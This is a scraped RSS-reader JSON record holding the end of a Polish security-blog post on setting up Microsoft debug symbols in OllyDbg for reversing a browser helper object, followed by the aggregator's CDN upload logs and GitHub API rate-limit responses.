|.  68 E8800401   PUSH btask.010480E8\n01032911  |.  50            PUSH EAX\n01032912  |.  895D E8       MOV [LOCAL.6],EBX\n01032915  |.  FF11          CALL DWORD PTR DS:[ECX]                                                             \n</pre>\n<p>pojawi się tylko i wyłącznie podpowiedź Olka w stylu:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\n01032915  |.  FF11          CALL DWORD PTR DS:[ECX]                ;  SHDOCVW.777D78E9\n</pre>\n<p>Oczywiście jest na to rada;). Skorzystanie z dobrodziejstwa symboli. Ale, ze względu na sędziwość Olka 1.1 i nie w pełni gotową jeszcze wersje 2.0, warto odseparować do osobnego katalogu tylko i wyłącznie symbole dla tych dll’ek, które faktycznie nas interesują czyli<br />\n<strong>SHDOCVW.dll</strong> i ew. <strong>MSHTML.dll</strong>. W innym wypadku możemy spodziewać się sporego czasu oczekiwania na koniec analizy przez Olka każdej dll’ki z osobna, a nawet czasami crashu.<br />\nSymbole dla pojedynczego pliku można pobrać używając narzędzia <a href=\"http://support.microsoft.com/kb/311503\" target=\"_blank\">symchk.exe</a><br />\nTworzymy zmienną środowiskową:<br />\n<strong>_NT_SYMBOL_PATH=symsrv*symsrv.dll*C:\\windows\\Sym</strong><br />\nA w katalogu <strong>C:\\windows\\Sym </strong>umieszczamy interesujące nas symbole:</p>\n<pre class=\"brush: plain; title: ; notranslate\">\nc:\\WINDOWS\\sym&#62;dir\n Volume in drive C has no label.\n Volume Serial Number is 44BE-4B9D\n\n Directory of c:\\WINDOWS\\sym\n\n01/27/2012  11:21 AM    &#60;DIR&#62;          .\n01/27/2012  11:21 AM    &#60;DIR&#62;          ..\n01/27/2012  11:21 AM    &#60;DIR&#62;          mshtml.pdb\n01/27/2012  11:21 AM    &#60;DIR&#62;          mshtmled.pdb\n01/27/2012  11:21 AM    &#60;DIR&#62;          shdocvw.pdb\n</pre>\n<p>A oto efekt:<br />\n<a href=\"http://www.icewall.pl/wp-content/uploads/2012/01/pdb.jpg\"><img src=\"http://www.icewall.pl/wp-content/uploads/2012/01/pdb.jpg\" alt=\"\" title=\"pdb\" width=\"871\" height=\"391\" class=\"aligncenter size-full wp-image-659\" srcset=\"http://www.icewall.pl/wp-content/uploads/2012/01/pdb.jpg 871w, http://www.icewall.pl/wp-content/uploads/2012/01/pdb-300x134.jpg 300w\" sizes=\"(max-width: 871px) 100vw, 871px\" /></a></p>\n<p>I z tak przygotowanym zestawem narzędzi jak i podejściem możemy kontynuować nasza zabawę w reversowanie BHO ;).</p>\n","descriptionType":"html","publishedDate":"Sat, 28 Jan 2012 00:12:24 +0000","feedId":37899,"bgimg":"http://www.icewall.pl/wp-content/uploads/2012/01/code_injection.jpg","linkMd5":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn97@2020_3/2020/09/06/21-27-18-274_5ae88001fe49c02a.webp","destWidth":1186,"destHeight":540,"sourceBytes":46120,"destBytes":25742,"author":"Icewall","articleImgCdnMap":{"http://www.icewall.pl/wp-content/uploads/2012/01/code_injection.jpg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn97@2020_3/2020/09/06/21-27-18-274_5ae88001fe49c02a.webp","http://www.icewall.pl/wp-content/uploads/2012/01/postdump1.jpg":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn6@2020_3/2020/09/06/21-27-19-769_778b7ac73b2a51ec.webp","http://www.icewall.pl/wp-content/uploads/2012/01/postdump2.jpg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn4@2020_6/2020/09/06/21-27-19-677_227c9db7e588adfc.webp","http://www.icewall.pl/wp-content/uploads/2012/01/events.jpg":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn25@2020_1/2020/09/06/21-27-19-713_860b3fdf83f51464.webp","http://www.icewall.pl/wp-content/uploads/2012/01/invoke.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn17@2020_2/2020/09/06/21-27-19-938_3bd44b285a2257e1.webp","http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke.jpg":null,"http://i.msdn.microsoft.com/dynimg/IC16039.gif":null,"http://www.icewall.pl/wp-content/uploads/2012/01/pdb.jpg":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn12@2020_4/2020/09/06/21-27-19-714_5e649d28e9aa520c.webp"},"publishedOrCreatedDate":1599427637674}],"record":{"createdTime":"2020-09-07 05:27:17","updatedTime":"2020-09-07 05:27:17","feedId":37899,"fetchDate":"Sun, 06 Sep 2020 21:27:17 +0000","fetchMs":877,"handleMs":2093,"totalMs":126381,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"73ea241ae7d255271935defd73b6cde0","hostName":"us-003*","requestId":"31d00024b9c8438e8fa04f4289755754_37899","contentType":"application/rss+xml; charset=UTF-8","totalBytes":199884,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":8,"articlesImgsGithubTotal":6,"successGithubMap":{"myreaderx21":1,"myreaderx13":1,"myreaderx1":1,"myreaderx5oss":1,"myreaderx29":1,"myreaderx19":1},"failGithubMap":{"myreaderx14":1}},"feed":{"createdTime":"2020-09-07 03:12:23","updatedTime":"2020-09-07 03:12:23","id":37899,"name":"Icewall's blog","url":"http://www.icewall.pl/?feed=rss2","subscriber":85,"website":null,"icon":"http://www.icewall.pl/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx64/cdn54@2020_5/2020/09/06/21-27-16-920_9d3575be3d7e4080.jpg","description":"IT Security","weekly":null,"link":"http://www.icewall.pl"},"noPictureArticleList":[{"createdTime":"2020-09-07 05:29:20","updatedTime":"2020-09-07 05:29:20","id":null,"feedId":37899,"linkMd5":"cc86d9a8a2a7f29a3fa0c5306bbc18f0"}],"tmpCommonImgCdnBytes":25742,"tmpBodyImgCdnBytes":174142,"tmpBgImgCdnBytes":0,"extra4":{"start":1599427634586,"total":0,"statList":[{"spend":995,"msg":"获取xml内容"},{"spend":2093,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":121638,"msg":"正文链接上传到cdn"}]},"extra5":8,"extra6":7,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke.jpg","sourceStatusCode":200,"destWidth":1111,"destHeight":466,"sourceBytes":66256,"destBytes":30226,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":868,"convertSpendMs":16,"createdTime":"2020-09-07 05:27:19","host":"europe-56*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn22/contents/2020/09/06/21-27-19-903_d6a35b9d51f13c23.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 06 Sep 2020 21:27:20 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["82D2:5DBC:7AD3B34:93E9B8B:5F555437"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599430042"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn22/contents/2020/09/06/21-27-19-903_d6a35b9d51f13c23.webp","historyStatusCode":[],"spendMs":407},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64.7 KB","destSize":"29.5 KB","compressRate":"45.6%"},{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/commented_invoke.jpg","sourceStatusCode":200,"destWidth":1111,"destHeight":466,"sourceBytes":66256,"destBytes":30226,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":625,"convertSpendMs":17,"createdTime":"2020-09-07 05:27:20","host":"europe-56*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn22/contents/2020/09/06/21-27-20-762_d6a35b9d51f13c23.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 06 Sep 2020 21:27:20 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["EA80:59C6:1A1B3F0B:1F9805BD:5F555437"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1599430042"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn22/contents/2020/09/06/21-27-20-762_d6a35b9d51f13c23.webp","historyStatusCode":[],"spendMs":244},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64.7 KB","destSize":"29.5 KB","compressRate":"45.6%"},null,null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe68.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-016.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/code_injection.jpg","sourceStatusCode":200,"destWidth":1186,"destHeight":540,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn97@2020_3/2020/09/06/21-27-18-274_5ae88001fe49c02a.webp","sourceBytes":46120,"destBytes":25742,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":1506,"convertSpendMs":18,"createdTime":"2020-09-07 05:27:17","host":"europe64*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0,cc86d9a8a2a7f29a3fa0c5306bbc18f0","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45 KB","destSize":"25.1 KB","compressRate":"55.8%"},{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/postdump2.jpg","sourceStatusCode":200,"destWidth":892,"destHeight":616,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn4@2020_6/2020/09/06/21-27-19-677_227c9db7e588adfc.webp","sourceBytes":65871,"destBytes":34720,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":1197,"convertSpendMs":21,"createdTime":"2020-09-07 05:27:19","host":"us-016*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64.3 KB","destSize":"33.9 KB","compressRate":"52.7%"},{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/events.jpg","sourceStatusCode":200,"destWidth":783,"destHeight":160,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn25@2020_1/2020/09/06/21-27-19-713_860b3fdf83f51464.webp","sourceBytes":50130,"destBytes":38492,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":1206,"convertSpendMs":15,"createdTime":"2020-09-07 05:27:19","host":"us-034*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"49 KB","destSize":"37.6 KB","compressRate":"76.8%"},{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/postdump1.jpg","sourceStatusCode":200,"destWidth":891,"destHeight":546,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn6@2020_3/2020/09/06/21-27-19-769_778b7ac73b2a51ec.webp","sourceBytes":36104,"destBytes":19746,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":1241,"convertSpendMs":14,"createdTime":"2020-09-07 05:27:19","host":"us-017*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"35.3 KB","destSize":"19.3 KB","compressRate":"54.7%"},{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/pdb.jpg","sourceStatusCode":200,"destWidth":871,"destHeight":391,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn12@2020_4/2020/09/06/21-27-19-714_5e649d28e9aa520c.webp","sourceBytes":78818,"destBytes":56202,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":1303,"convertSpendMs":18,"createdTime":"2020-09-07 05:27:19","host":"us-006*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"77 KB","destSize":"54.9 KB","compressRate":"71.3%"},{"code":1,"isDone":false,"source":"http://www.icewall.pl/wp-content/uploads/2012/01/invoke.jpg","sourceStatusCode":200,"destWidth":1111,"destHeight":466,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn17@2020_2/2020/09/06/21-27-19-938_3bd44b285a2257e1.webp","sourceBytes":50653,"destBytes":24982,"targetWebpQuality":75,"feedId":37899,"totalSpendMs":1779,"convertSpendMs":17,"createdTime":"2020-09-07 05:27:19","host":"europe68*","referer":"http://www.icewall.pl/?p=622","linkMd5ListStr":"cc86d9a8a2a7f29a3fa0c5306bbc18f0","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"49.5 KB","destSize":"24.4 KB","compressRate":"49.3%"}],"successGithubMap":{"myreaderx21":1,"myreaderx13":1,"myreaderx1":1,"myreaderx5oss":1,"myreaderx29":1,"myreaderx19":1},"failGithubMap":{"myreaderx14":1}}